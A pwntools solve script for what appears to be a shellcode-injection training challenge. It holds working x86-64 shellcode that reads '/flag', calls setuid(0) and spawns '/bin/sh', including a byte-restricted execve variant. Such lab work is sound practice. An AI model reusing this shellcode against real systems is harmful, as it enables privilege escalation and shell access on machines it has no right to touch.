from pwn import *

pwnable = './babyshell_level10_testing1'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])

context.log_level = 'DEBUG'
context(os = 'linux', arch = 'amd64')

debug_set_1 = '''
    b main
    b *0x5555555556a4
    '''
    #b *0x5555555554cc
    #b *0x555555555628
    #b *0x555555555634
    #b *0x555555555645
    
    #b *0x5555555555af
    #b *0x5555555554c8

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    #p = process(pwnable)
    #gdb.attach(p, debug_set_1)
    p = gdb.debug(pwnable, debug_set_1)
else:
    p = process(pwnable)
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    p = process(pwnable, debug_set_1)

shellcode_2 = '''
    push 0x616C662F
    push 0x67
    pop rcx
    mov [rsp+4], ecx
    lea rdi, [rsp]
    xor rsi, rsi
    xor rax, rax
    inc rax
    inc rax
    syscall

    mov rbx, rax

    lea rsi, [rsp]
    mov rdi, rbx
    push 0x7f
    pop rdx
    xor rax, rax
    syscall

    lea rsi, [rsp]
    xor rdi, rdi
    inc rdi
    mov rdx, rax
    xor rax, rax
    inc rax
    syscall

    push 60
    pop rax
    syscall

'''

shellcode_3 = '''
push 0
pop rdi
push 105
pop rax
syscall


mov rax, 59
lea rdi, [rip+binsh]
pop rsi

mov rsi, 0
mov rdx, 0
syscall
stc
stc

binsh:
.string "/bin/sh"
'''
shellcode_4 = '''
push rax
pop rdx
push rdx
pop rsi
mov rbx, 0x68732f6e696221
or r8b, 0xe
add rbx, r8
push rbx    
push rsp
pop rdi
mov al, 0x3b
syscall
'''

#shellcode = asm(shellcode_2)
#shellcode = asm(shellcode_3)
shellcode = asm(shellcode_4)

p.recvuntil("0x1337000.\n")
p.send(shellcode)
#p.send(shellcode)
#p.recvuntil("Segmentation fault")
p.wait_for_close()
